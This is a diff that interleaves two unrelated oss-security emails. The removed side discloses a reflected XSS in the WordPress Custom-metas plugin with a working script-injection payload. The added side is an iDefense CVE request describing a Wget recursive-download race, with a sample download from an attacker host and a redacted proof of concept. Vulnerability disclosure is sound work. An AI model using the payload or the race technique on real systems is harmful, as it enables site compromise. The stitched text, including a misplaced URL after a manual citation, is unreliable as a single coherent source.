@@ -1,60 +1,134 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/5
-Message-ID: <CAOmn9FQVJ7QQf1rk4v8P07UoRpW-=L+k24dKCVP61fmpD_32mA@mail.gmail.com>
-Date: Sat, 16 Apr 2016 13:59:06 +0530
-From: shravan kumar <cor3sm4sh3r@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Reflected XSS Vulnerability in Wordpress Custom-metas plugin 1.5.1
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/12/2
+Message-ID: <F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>
+Date: Thu, 11 Aug 2016 21:11:56 +0000
+From: "Misra, Deapesh" <dmisra@...isign.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+CC: "dawid@...alhackers.com" <dawid@...alhackers.com>, "bug-wget@....org" <bug-wget@....org>
+Subject: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Hello  ,
+Hi,
+
+------------------
+- Background -
+------------------
+
+Here at iDefense, Verisign Inc, we have a Vulnerability Contributor Program (VCP) where we buy vulnerabilities. 
+
+Recently, security researcher Dawid Golunski sold us an interesting vulnerability within Wget. We asked Red Hat (secalert at redhat dot com) if they would help us with the co-ordination (patching, disclosure, etc) of this vulnerability. Once they graciously accepted, we discussed the vulnerability with them. After their initial triage, Red Hat recommended that we publicly post the details of this vulnerability to this mailing list for further discussion and hence this email.
+
+----------
+- Title -
+----------
+
+Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability
+
+------------------------
+-  Vulnerable Version  -
+------------------------
+
+GNU Wget <= 1.17       Race Condition / Access-list Bypass
+
+-------------------
+-  Vulnerability  -
+-------------------
+
+When wget is used in recursive/mirroring mode, according to the manual it can take the following access list options:
+
+"Recursive Accept/Reject Options:
+  -A acclist --accept acclist
+  -R rejlist --reject rejlist
+
+Specify comma-separated lists of file name suffixes or patterns to accept or reject. Note that if any of the wildcard characters, *, ?, [ or ], appear in an element of acclist or rejlist, it will be treated as a pattern, rather than a suffix."
+
+These can for example be used to only download JPG images. 
+
+The vulnerability surfaces when wget is used to download a single file with recursive option (-r / -m) and an access list ( -A ), wget only applies the list at the end of the download process. 
+
+This can be observed on the output below:
+
+	# wget -r -nH -A '*.jpg' http://attackers-server/test.php
+	Resolving attackers-server... 192.168.57.1
+	Connecting to attackers-server|192.168.57.1|:80... connected.
+	HTTP request sent, awaiting response... 200 OK
+	Length: unspecified [text/plain]
+	Saving to: 'test.php'
+
+	15:05:46 (27.3 B/s) - 'test.php' saved [52]
+
+	Removing test.php since it should be rejected.
+
+	FINISHED
 
 
-I would like to disclose a XSS vulnerability in Custom-metas plugin version
-1.5.1  .
-
-The Plugin can be found at https://wordpress.org/plugins/custom-metas/
+Although the file get successfully deleted in the end, this creates a race condition situation as an attacker who has control over the URL, could slow down the download process so that he had a chance to make use of the malicious file before it gets deleted.
 
 
-Reproduction steps:
-
-   - Install the plugin custom-metas
-   - Log in to wp-admin as administrator (tested on firefox)
-   - Pass the XSS payload as GET parameter to the
-   /wp-admin/admin.php?page=custom-metas&paged=<XSS payload here>
-   - example
-   http://targetip/WPinstallationdir/wp-admin/admin.php?page=custom-metas&paged=
-   "><script>alert(1);</script>
-   - you will see a alert box.
-
-Technical details:
-
-This vulnerability is due to display of unsanitized GET parameters, which
-are directly displayed on the page with-out any filters.
-
-The vulnerable page is
-
-/wp-content/plugins/custom-metas/tpl/meta-data-form-multiple.php
+It is very easy for an attacker to win this race as the file only gets deleted after the HTTP connection is terminated. He can therefore keep the connection open as long as necessary to make use of the uploaded file.  Below is proof of concept exploit that demonstrates this technique.  
 
 
-The Code responsible for the vulnerability is
+----------------------
+-  Proof of Concept  -
+----------------------
 
-LINE 10
- $currentPageNo = ( isset($_GET['paged']) && $_GET['paged'] != "")?
-$_GET['paged']:1;
+< REDACTED BY iDefense FOR THE TIME BEING >
 
-the currentPageNo variable is set using $_GET['paged'] .
+-------------------
+-  Discussion  -
+-------------------
 
-It is then displayed in unsafe manner i.e without any filters. in following
-line of code
+>From the wget manual:
 
-LINE 43
+https://access.redhat.com/security/team/contact
 
-<input type="text" size="2" value="<?php echo $currentPageNo;?>"
-name="paged" title="Current page" id="postCurrent" class="current-page" />
-of <span class="total-pages"><?php echo $tPostNumCount; ?></span>
+> Finally, it's worth noting that the accept/reject lists are matched twice against downloaded files: once against the URL's filename portion, to determine if the file should be downloaded in the first place; then, after it has been accepted and successfully downloaded, the local file's name is also checked against the accept/reject lists to see if it should be removed. The rationale was that, since '.htm' and '.html' files are always downloaded regardless of accept/reject rules, they should be removed after being downloaded and scanned for links, if they did match the accept/reject lists. However, this can lead to unexpected results, since the local filenames can differ from the original URL filenames in the following ways, all of which can change whether an accept/reject rule matches: 
 
 
--- 
-Shravan Kumar
+and from the source code, in file recur.c:
+
+      if (file
+          && (opt.delete_after
+              || opt.spider /* opt.recursive is implicitely true */
+              || !acceptable (file)))
+        {
+          /* Either --delete-after was specified, or we loaded this
+             (otherwise unneeded because of --spider or rejected by -R)
+             HTML file just to harvest its hyperlinks -- in either case,
+             delete the local file. */
+          DEBUGP (("Removing file due to %s in recursive_retrieve():\n",
+                   opt.delete_after ? "--delete-after" :
+                   (opt.spider ? "--spider" :
+                    "recursive rejection criteria")));
+          logprintf (LOG_VERBOSE,
+                     (opt.delete_after || opt.spider
+                      ? _("Removing %s.\n")
+                      : _("Removing %s since it should be rejected.\n")),
+                     file);
+          if (unlink (file))
+            logprintf (LOG_NOTQUIET, "unlink: %s\n", strerror (errno));
+          logputs (LOG_VERBOSE, "\n");
+          register_delete_file (file);
+        }
+
+
+it is evident that the accept/reject rule is applied only after the download. This seems to be a design decision which has a security aspect to it. As discussed above, 
+   - an attacker can ensure that the files which were not meant to be downloaded are downloaded to the location on the victim server (which should be a publicly accessible location) 
+   - the attacker can keep the connection open, even if the file/s have been downloaded on the victim server
+   - the attacker can then access these files OR use them in a separate attack
+   - the victim server's security is impacted since the developer/administrator was never warned explicitly that 'rejected files' can have a transient life on the victim server
+
+
+It looks like the design for wget needs to be changed so that the file it downloads to 'recursively search' through is not saved in a location which is accessible by the attacker. Additionally the documentation needs to be enhanced with the explicit mention of the 'transient nature' of the files which are to be rejected.
+
+
+We welcome your comments/suggestions.
+
+thanks,
+
+Deapesh.
+iDefense Labs, Verisign Inc.
+http://www.verisign.com/en_US/security-services/security-intelligence/vulnerability-reports/index.xhtml
+
+PS: I hope the maintainer Giuseppe Scrivano gets to see this via the bug-wget list I have CC-ed.
 
